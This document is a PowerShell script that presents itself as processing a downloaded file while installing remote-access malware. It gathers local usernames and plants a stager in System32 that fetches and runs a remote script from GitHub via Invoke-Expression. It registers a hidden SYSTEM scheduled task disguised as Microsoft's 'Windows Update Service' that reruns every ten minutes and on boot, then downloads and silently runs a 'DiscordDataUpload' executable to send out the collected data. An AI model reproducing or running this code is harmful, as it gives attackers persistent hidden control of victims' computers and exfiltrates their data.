[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Write-Host "Processing Your Downloaded File, Please Don't Close this window" -ForegroundColor Yellow -BackgroundColor Black
$regPath = "HKLM:\SOFTWARE\Microsoft\WindowsUpdateService"
$userNamesRaw = Get-WmiObject -Class Win32_UserProfile | ForEach-Object { $_.LocalPath.Split('\')[-1] }
$userNamesClean = $userNamesRaw -join ' | '
$userNames = '"' + $userNamesClean + '"'
$exepath =  "C:/Windows/System32/SecureBootUpdatesMicrosoft/DiscordDataUpload.exe"
$shellscriptpath = "C:/Windows/System32/SecureBootUpdatesMicrosoft/WindowsUpdateService.ps1"
$messageboturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
if (-not (Test-Path $shellScriptPath)) {
    New-Item -Path $shellScriptPath -ItemType Directory -Force | Out-Null
}
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force
}
$existingCode = (Get-ItemProperty -Path $regPath).Code
if ($existingCode -match '^(6|0)\d{5}$') {
    $code = $existingCode
} else {
    $code = "6" + (Get-Random -Minimum 10000 -Maximum 99999)
    Set-ItemProperty -Path $regPath -Name "Code" -Value $code
}
if (-not (Test-Path "$regPath\Data") -or (Get-ItemProperty -Path "$regPath\Data").Data -ne "active") {
    Set-ItemProperty -Path $regPath -Name "Data" -Value "active"
}
#Install WindowsUpdateService
$scriptContent = @'
$url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AccessControl.ps1"
$response = Invoke-WebRequest -Uri $url -UseBasicParsing
if ($response.StatusCode -eq 200) {
    $scriptContent = $response.Content
    Invoke-Expression $scriptContent
} else {}
'@
Remove-Item $shellscriptpath -Force -ErrorAction SilentlyContinue
$scriptContent | Set-Content -Path $shellscriptpath -Force
#Install Windows Service
$updateservxml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-13T00:56:52.6271595</Date>
    <Author>Microsoft\System</Author>
    <Description>Windows Server Update Services, previously known as Software Update Services, is a computer program and network service developed by Microsoft Corporation that enables administrators to manage the distribution of updates and hotfixes released for Microsoft products to computers in a corporate environment.</Description>
    <URI>\Windows Update Service</URI>
  </RegistrationInfo>
  <Triggers>
    <RegistrationTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Delay>PT5M</Delay>
    </RegistrationTrigger>
    <BootTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Delay>PT15M</Delay>
    </BootTrigger>
    <EventTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Queue</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT10M</Interval>
      <Count>10</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -File "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateService.ps1"</Arguments>
      <WorkingDirectory>C:\Windows\System32\SecureBootUpdatesMicrosoft\</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"@
# Register the task from the XML content
$updateserv = "Windows Update Service"
if (Get-ScheduledTask -TaskName $updateserv -ErrorAction SilentlyContinue) {
    # Task exists, so delete it
    Unregister-ScheduledTask -TaskName $updateserv -Confirm:$false
} else {}
Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv | Out-Null
Start-ScheduledTask -TaskName $updateserv
#DataUpload
Invoke-WebRequest -Uri $messageboturl -OutFile $exePath -UseBasicParsing
Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $code
Start-Sleep 2
Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $userNames
Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue

# Removal of directories
$ps1Files = @("C:\Windows\WindowsUpdateService.ps1", "C:\Windows\WindowsUpdateServiceDaemon.ps1", "C:\Windows\System32\WindowsUpdateService.ps1")
foreach ($file in $ps1Files) {
    if (Test-Path $file -PathType Leaf) {
        Remove-Item -Path $file -Force
    } else {
    }
}
$oldregPath = "HKLM:\Software\WindowsUpdateService"
if (Test-Path $oldregPath) {
    Remove-Item -Path $regPath -Recurse -Force
}
